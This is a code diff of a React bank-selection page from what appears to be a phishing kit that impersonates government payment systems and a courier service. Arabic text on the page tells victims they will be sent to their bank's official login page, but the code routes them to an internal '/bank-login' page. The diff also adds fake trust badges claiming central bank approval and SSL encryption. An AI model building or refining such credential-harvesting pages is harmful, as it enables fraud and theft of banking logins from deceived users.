@@ -4,7 +4,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, ArrowLeft, Loader2 } from "lucide-react";
+import { Building2, ArrowRight, Loader2, Shield, CheckCircle2, ChevronRight } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
@@ -23,30 +23,20 @@ const PaymentBankSelector = () => {
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
   
-  // Get country from link data
   const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
-  
-  // Get government payment system
   const govSystem = getGovernmentPaymentSystem(countryCode);
   
-  // Get preselected bank from link payload if available
-  const preselectedBank = linkData?.payload?.selected_bank;
-  
-  // Get customer info from link data (cross-device compatible)
-  const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceKey = linkData?.payload?.service_key || 'payment';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
 
-  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -58,280 +48,248 @@ const PaymentBankSelector = () => {
     }
   }
 
-  // Get saved currency code from payment_data or shipping info
-  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
-  const formattedAmount = formatCurrency(amount, currencyCode);
+  const formattedAmount = formatCurrency(amount, countryCode);
   
-  // Load banks when country is available from link data
   useEffect(() => {
     if (countryCode) {
       setLoadingBanks(true);
-      // Simulate API call
       setTimeout(() => {
         const countryBanks = getBanksByCountry(countryCode);
         setBanks(countryBanks);
         setLoadingBanks(false);
-        
-        // Auto-select bank if it was preselected during link creation
-        if (preselectedBank) {
-          setSelectedBank(preselectedBank);
-        }
       }, 300);
     }
-  }, [countryCode, preselectedBank]);
+  }, [countryCode]);
   
-  const handleBankSelect = (bankId: string) => {
-    setSelectedBank(bankId);
-  };
-  
-  const handleSkip = async () => {
+  const handleBankSelect = async (bankId: string) => {
     if (!linkData) return;
 
-    // Save to link for cross-device compatibility
     try {
       const updatedPayload = {
         ...linkData.payload,
         selectedCountry: countryCode,
-        selectedBank: 'skipped',
+        selectedBank: bankId,
       };
 
       await updateLink.mutateAsync({
         linkId: id!,
-        payload: updatedPayload
+        payload: updatedPayload,
       });
+
+      navigate(`/pay/${id}/bank-login`);
     } catch (error) {
-      console.error('Error saving bank selection:', error);
+      console.error("Error updating bank selection:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء اختيار البنك",
+        variant: "destructive",
+      });
     }
-
-    toast({
-      title: "تم التخطي",
-      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
-    });
-
-    navigate(`/pay/${id}/card-input`);
   };
 
-  const handleContinue = async () => {
-    if (!linkData || !selectedBank) return;
-
-    // Save to link for cross-device compatibility
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: selectedBank,
-      };
-
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-      console.error('Error saving bank selection:', error);
-    }
-
-    navigate(`/pay/${id}/card-input`);
-  };
-  
-  // Show loading state while fetching link data
-  if (linkLoading || !linkData) {
+  if (linkLoading) {
     return (
-      <div 
-        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
-        dir="rtl"
-        style={{
-          background: govSystem.colors.surface
-        }}
-      >
+      <div className="min-h-screen flex items-center justify-center bg-background">
         <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
-          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
+          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
+          <p className="text-lg text-muted-foreground">جاري التحميل...</p>
         </div>
       </div>
     );
   }
-  
-  // Show error if no country data
-  if (!countryData) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
-          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
-  
+
   return (
     <div 
-      className="min-h-screen py-4 sm:py-12 bg-background" 
+      className="min-h-screen" 
+      style={{ backgroundColor: govSystem.colors.background }}
       dir="rtl"
-      style={{
-        background: govSystem.colors.surface
-      }}
     >
-      <div className="container mx-auto px-4 max-w-2xl">
-        {/* Header */}
-        <div className="mb-6">
-          <button
-            onClick={() => navigate(`/pay/${id}/details`)}
-            className="flex items-center gap-2 text-sm mb-4"
-            style={{ color: govSystem.colors.textLight }}
-          >
-            <ArrowLeft className="w-4 h-4" />
-            <span>رجوع</span>
-          </button>
-          
-          <div className="flex items-center gap-3 mb-2">
-            <div
-              className="w-12 h-12 rounded-full flex items-center justify-center"
-              style={{
-                background: govSystem.gradients.primary,
-              }}
+      <div 
+        className="relative h-32 sm:h-40"
+        style={{ background: govSystem.gradients.header }}
+      >
+        <div className="absolute inset-0 bg-gradient-to-b from-black/20 to-transparent" />
+        
+        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6 relative z-10">
+          <div className="flex items-center gap-3 sm:gap-4">
+            <div 
+              className="bg-white p-2 sm:p-3 rounded-xl shadow-lg"
+              style={{ boxShadow: govSystem.shadows.lg }}
             >
-              <Building2 className="w-6 h-6 text-white" />
+              {govSystem.logo && (
+                <img 
+                  src={govSystem.logo} 
+                  alt={govSystem.nameAr} 
+                  className="h-10 sm:h-14 object-contain" 
+                />
+              )}
             </div>
-            <div>
-              <h1 className="text-2xl font-bold" style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}>اختر البنك</h1>
-              <p className="text-sm" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
-                {govSystem.nameAr} - {formattedAmount}
-              </p>
+            <div className="text-white">
+              <h1 className="font-bold text-xl sm:text-2xl mb-0.5">{govSystem.nameAr}</h1>
+              <p className="text-xs sm:text-sm opacity-90">اختيار البنك</p>
             </div>
           </div>
-        </div>
-
-        {/* Country Badge */}
-        {countryData && (
-          <div className="mb-4">
+          
+          <div className="flex items-center gap-2">
             <Badge 
-              className="text-sm px-3 py-1.5"
+              className="hidden sm:flex items-center gap-1 px-3 py-1.5"
               style={{ 
-                background: govSystem.gradients.primary,
-                color: govSystem.colors.textOnPrimary,
-                fontFamily: govSystem.fonts.primaryAr
+                backgroundColor: 'rgba(255, 255, 255, 0.25)',
+                backdropFilter: 'blur(10px)',
+                border: '1px solid rgba(255, 255, 255, 0.3)',
+                color: 'white'
               }}
             >
-              {countryData.flag} {countryData.nameAr} - {govSystem.nameAr}
+              <Shield className="w-4 h-4" />
+              <span className="text-xs font-semibold">آمن ومعتمد</span>
             </Badge>
           </div>
-        )}
+        </div>
+      </div>
 
-        {/* Loading Banks */}
-        {loadingBanks ? (
-          <div className="text-center py-12">
-            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
-            <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البنوك...</p>
-          </div>
-        ) : banks.length === 0 ? (
-          <Card className="p-8 text-center" style={{ borderRadius: govSystem.borderRadius.lg }}>
-            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: govSystem.colors.textLight }} />
-            <p className="mb-4" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>لا توجد بنوك متاحة لهذه الدولة</p>
-            <Button 
-              onClick={handleSkip} 
-              variant="outline"
-              style={{ 
-                borderColor: govSystem.colors.primary,
-                color: govSystem.colors.primary,
-                fontFamily: govSystem.fonts.primaryAr
-              }}
-            >
-              متابعة بدون تحديد بنك
-            </Button>
+      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
+        <div className="max-w-4xl mx-auto">
+          <Card 
+            className="p-4 sm:p-6 mb-6 shadow-lg"
+            style={{ 
+              borderTop: `4px solid ${govSystem.colors.primary}`,
+              boxShadow: govSystem.shadows.lg 
+            }}
+          >
+            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+              <div>
+                <h2 className="text-xl sm:text-2xl font-bold mb-1">اختر البنك الخاص بك</h2>
+                <p className="text-sm text-gray-600">{serviceName}</p>
+              </div>
+              <div 
+                className="px-4 sm:px-6 py-2 sm:py-3 rounded-xl text-white font-bold text-lg sm:text-xl"
+                style={{ backgroundColor: govSystem.colors.primary }}
+              >
+                {formattedAmount}
+              </div>
+            </div>
           </Card>
-        ) : (
-          <>
-            {/* Banks Grid */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
+
+          <div 
+            className="mb-6 p-4 rounded-xl border-r-4"
+            style={{ 
+              backgroundColor: `${govSystem.colors.primary}08`,
+              borderColor: govSystem.colors.primary 
+            }}
+          >
+            <div className="flex items-start gap-3">
+              <Shield className="w-5 h-5 shrink-0 mt-0.5" style={{ color: govSystem.colors.primary }} />
+              <div>
+                <p className="font-bold text-sm mb-1">تسجيل دخول آمن ومباشر</p>
+                <p className="text-xs text-gray-700">
+                  ستتم إعادة توجيهك إلى صفحة تسجيل الدخول الرسمية للبنك المختار لإكمال عملية الدفع بشكل آمن عبر {govSystem.nameAr}
+                </p>
+              </div>
+            </div>
+          </div>
+
+          {loadingBanks ? (
+            <div className="text-center py-12">
+              <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
+              <p className="text-gray-600">جاري تحميل البنوك المتاحة...</p>
+            </div>
+          ) : (
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
               {banks.map((bank) => (
                 <Card
                   key={bank.id}
-                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
-                    selectedBank === bank.id
-                      ? 'ring-2'
-                      : 'hover:bg-accent/50'
+                  className={`p-4 sm:p-5 cursor-pointer transition-all duration-200 border-2 hover:scale-[1.02] hover:shadow-xl ${
+                    selectedBank === bank.id ? 'ring-2 ring-offset-2' : ''
                   }`}
                   style={{
-                    borderColor: selectedBank === bank.id ? govSystem.colors.primary : govSystem.colors.border,
-                    backgroundColor: selectedBank === bank.id ? `${govSystem.colors.primary}05` : undefined,
-                    borderRadius: govSystem.borderRadius.md,
-                    borderWidth: selectedBank === bank.id ? '2px' : '1px'
+                    borderColor: selectedBank === bank.id ? govSystem.colors.primary : '#E0E0E0',
+                    background: selectedBank === bank.id ? `${govSystem.colors.primary}08` : 'white',
+                    ringColor: selectedBank === bank.id ? govSystem.colors.primary : 'transparent',
                   }}
                   onClick={() => handleBankSelect(bank.id)}
                 >
-                  <div className="flex items-center gap-3">
-                    <div
-                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
-                      style={{
-                        background: selectedBank === bank.id
-                          ? govSystem.gradients.primary
-                          : '#64748b',
-                        fontFamily: govSystem.fonts.primaryAr
+                  <div className="flex items-center gap-3 sm:gap-4">
+                    <div 
+                      className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl flex items-center justify-center shrink-0 bg-white border-2"
+                      style={{ 
+                        borderColor: bank.color || govSystem.colors.border,
+                        backgroundColor: bank.color ? `${bank.color}05` : 'white'
                       }}
                     >
-                      {bank.nameAr.charAt(0)}
+                      {bank.logo ? (
+                        <img 
+                          src={bank.logo} 
+                          alt={bank.nameAr} 
+                          className="h-10 sm:h-12 w-auto object-contain p-1"
+                        />
+                      ) : (
+                        <Building2 
+                          className="w-8 h-8" 
+                          style={{ color: bank.color || govSystem.colors.primary }} 
+                        />
+                      )}
                     </div>
                     <div className="flex-1">
-                      <h3 className="font-semibold text-sm" style={{ fontFamily: govSystem.fonts.primaryAr, color: govSystem.colors.text }}>{bank.nameAr}</h3>
-                      <p className="text-xs" style={{ color: govSystem.colors.textLight }}>{bank.name}</p>
+                      <h3 className="font-bold text-base sm:text-lg mb-0.5">{bank.nameAr}</h3>
+                      <p className="text-xs sm:text-sm text-gray-600">{bank.name}</p>
                     </div>
-                    {selectedBank === bank.id && (
-                      <div
-                        className="w-5 h-5 rounded-full flex items-center justify-center"
-                        style={{ backgroundColor: govSystem.colors.primary }}
-                      >
-                        <svg
-                          className="w-3 h-3 text-white"
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
-                        >
-                          <path d="M5 13l4 4L19 7" />
-                        </svg>
-                      </div>
-                    )}
+                    <ChevronRight 
+                      className="w-5 h-5 sm:w-6 sm:h-6 shrink-0" 
+                      style={{ color: govSystem.colors.primary }} 
+                    />
                   </div>
                 </Card>
               ))}
             </div>
+          )}
 
-            {/* Action Buttons */}
-            <div className="space-y-3">
-              <Button
-                onClick={handleContinue}
-                disabled={!selectedBank}
-                className="w-full h-12 text-base font-semibold"
-                style={{
-                  background: selectedBank
-                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                    : undefined,
-                }}
-              >
-                متابعة
-              </Button>
-              
-              <Button
-                onClick={handleSkip}
+          {banks.length === 0 && !loadingBanks && (
+            <Card className="p-8 text-center">
+              <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
+              <h3 className="text-xl font-bold mb-2">لا توجد بنوك متاحة</h3>
+              <p className="text-gray-600 mb-4">لا توجد بنوك مدعومة لهذه الدولة حالياً</p>
+              <Button 
                 variant="outline"
-                className="w-full h-12 text-base"
+                onClick={() => navigate(`/pay/${id}/details`)}
               >
-                تخطي واستخدام أي بنك
+                رجوع
               </Button>
-            </div>
+            </Card>
+          )}
 
-            {/* Info Note */}
-            <div className="mt-6 p-4 bg-muted/50 rounded-lg">
-              <p className="text-xs text-muted-foreground text-center">
-                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
-              </p>
-            </div>
-          </>
-        )}
+          <div className="mt-6 grid grid-cols-1 sm:grid-cols-3 gap-3">
+            <Card className="p-3 bg-green-50 border-green-200">
+              <div className="flex items-center gap-2">
+                <CheckCircle2 className="w-4 h-4 text-green-700 shrink-0" />
+                <p className="text-xs font-semibold text-green-900">معتمد من البنك المركزي</p>
+              </div>
+            </Card>
+
+            <Card className="p-3 bg-blue-50 border-blue-200">
+              <div className="flex items-center gap-2">
+                <Shield className="w-4 h-4 text-blue-700 shrink-0" />
+                <p className="text-xs font-semibold text-blue-900">تشفير SSL 256-bit</p>
+              </div>
+            </Card>
+
+            <Card className="p-3 bg-purple-50 border-purple-200">
+              <div className="flex items-center gap-2">
+                <Building2 className="w-4 h-4 text-purple-700 shrink-0" />
+                <p className="text-xs font-semibold text-purple-900">دفع مباشر وآمن</p>
+              </div>
+            </Card>
+          </div>
+
+          <div className="mt-4 text-center">
+            <Button
+              variant="outline"
+              onClick={() => navigate(`/pay/${id}/details`)}
+              className="w-full sm:w-auto"
+            >
+              رجوع إلى تفاصيل الدفع
+            </Button>
+          </div>
+        </div>
       </div>
     </div>
   );
